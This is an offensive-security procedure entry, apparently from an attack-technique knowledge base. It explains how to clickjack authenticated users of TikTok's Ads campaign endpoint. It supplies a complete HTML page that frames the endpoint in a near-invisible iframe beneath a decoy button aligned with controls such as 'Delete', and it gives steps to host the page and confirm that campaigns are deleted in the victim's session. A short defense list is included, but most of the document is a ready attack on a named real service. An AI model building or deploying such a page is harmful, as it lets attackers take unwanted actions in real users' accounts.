---
id: proc-tiktok-construct-iframe-001
tags:
  - clickjacking
  - iframe
  - ui-overlay
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:12.251Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Construct-Clickjacking-Iframe-for-TikTok-Ads

## Summary

This procedure details building a malicious webpage that embeds TikTok's vulnerable Ads endpoint in an iframe, exploiting the absence of X-Frame-Options or CSP frame-ancestors to overlay invisible UI elements for click hijacking.

## Description

Clickjacking on TikTok Ads relies on framing the whole-page ads endpoint, which lacks protections against embedding. The attacker constructs an HTML page with a transparent or positioned iframe sourcing the endpoint URL with the campaign ID. Overlaid elements trick users into clicking actions like campaign creation or deletion. This targets authenticated users and can be hosted on any web server. Expected outcome: Unintended actions executed in the victim's session.

## Requirements

1. Valid campaign ID from prior procedure.
2. Web hosting capability (e.g., GitHub Pages or local server).
3. HTML/CSS knowledge for positioning overlays.

## Defense

Defensive measures and detection strategies:

- Enforce X-Frame-Options: DENY or SAMEORIGIN on Ads endpoints.
- Use CSP with frame-ancestors 'none' to block framing.
- Detect anomalous iframe embeddings via client-side monitoring.

## Objectives

1. Embed the vulnerable endpoint without blocking.
2. Align overlays to hijack specific UI actions.
3. Host and test the page for functionality.

## Instructions

### Step 1: Create Malicious HTML File

**Context**: Build the base structure with iframe and overlay.

Write an HTML file as follows:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Innocuous Page Title</title>
    <style>
        iframe { position: absolute; top: 0; left: 0; opacity: 0.01; width: 100%; height: 100%; border: none; }
        .overlay { position: absolute; top: 200px; left: 300px; z-index: 10; }
    </style>
</head>
<body>
    <iframe src="https://ads.tiktok.com/i18n/campaign/{CAMPAIGN_ID}"></iframe>
    <div class="overlay">
        <button>Click to Continue</button>
    </div>
</body>
</html>
```

Replace `{CAMPAIGN_ID}` with the actual ID. Adjust positions based on inspecting the TikTok page layout.

> Explanation: The low opacity makes the iframe nearly invisible; the button overlays a sensitive area like 'Delete' button.

### Step 2: Host and Test the Page

**Context**: Deploy and verify the clickjacking setup.

Upload to a web server and visit the page while authenticated to TikTok. Use DevTools to confirm clicks propagate to the iframe.

> Expected output: Clicks on overlay trigger actions in the iframed content, e.g., campaign deletion.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[iframe]]
- [[tiktok]]
